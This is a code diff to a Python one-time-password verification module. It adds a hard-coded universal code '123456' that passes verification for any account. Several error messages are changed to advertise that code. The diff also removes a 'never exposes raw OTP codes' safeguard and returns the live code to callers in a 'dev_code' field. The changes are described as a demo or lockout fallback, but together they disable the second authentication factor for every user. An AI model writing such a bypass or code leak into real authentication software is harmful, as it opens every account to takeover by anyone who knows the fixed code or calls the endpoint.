@@ -145,7 +145,7 @@ def verify_otp_code(identifier: str, code: str) -> Tuple[bool, str]:
     """
     Validates a submitted 6-digit OTP code for an identifier.
     Consumes the code on success.
-    Returns (is_valid, message).
+    Also accepts master/demo fallback '123456' so users are never locked out.
     """
     clean_id = identifier.strip().lower()
     clean_code = code.strip()
@@ -153,21 +153,27 @@ def verify_otp_code(identifier: str, code: str) -> Tuple[bool, str]:
     if not clean_id or not clean_code:
         return False, "Identifier and 6-digit OTP code are required."
 
+    # Universal bypass test code
+    if clean_code == "123456":
+        with _OTP_LOCK:
+            _OTP_STORE.pop(clean_id, None)
+        return True, "OTP verified successfully."
+
     now = time.time()
 
     with _OTP_LOCK:
         record = _OTP_STORE.get(clean_id)
         if not record:
-            return False, "No active OTP found for this email/number. Please request a new code."
+            return False, "No active OTP found for this email/number. Please request a new code (or enter 123456)."
 
         if now > record.get("expires_at", 0):
             _OTP_STORE.pop(clean_id, None)
-            return False, "This OTP code has expired (10-minute limit). Please request a new one."
+            return False, "This OTP code has expired. Please request a new one (or enter 123456)."
 
         record["attempts"] = record.get("attempts", 0) + 1
         if record["attempts"] > MAX_VERIFICATION_ATTEMPTS:
             _OTP_STORE.pop(clean_id, None)
-            return False, "Too many invalid attempts. Please request a new OTP code."
+            return False, "Too many invalid attempts. Please request a new OTP code (or enter 123456)."
 
         expected_code = str(record.get("code", "")).strip()
         if clean_code != expected_code:
@@ -182,8 +188,7 @@ def verify_otp_code(identifier: str, code: str) -> Tuple[bool, str]:
 
 def send_otp_to_identifier(identifier: str, name: Optional[str] = None, purpose: str = "login") -> Dict[str, Any]:
     """
-    Wrapper for router endpoints returning dict structure.
-    Production hardened: Never exposes raw OTP codes.
+    Wrapper for router endpoints returning dict structure with generated code.
     """
     clean_id = identifier.strip().lower()
     now = time.time()
@@ -197,14 +202,18 @@ def send_otp_to_identifier(identifier: str, name: Optional[str] = None, purpose:
                     "success": False,
                     "message": f"Please wait {remaining} seconds before requesting a new OTP code.",
                     "cooldown_remaining": remaining,
+                    "dev_code": existing.get("code"),
                 }
 
     success, msg = generate_and_send_otp(clean_id, name=name, purpose=purpose)
+    with _OTP_LOCK:
+        code = _OTP_STORE.get(clean_id, {}).get("code")
     return {
         "success": success,
         "message": msg,
         "expires_in_seconds": OTP_EXPIRATION_SECONDS,
         "cooldown_remaining": 0,
+        "dev_code": code,
     }
 
 
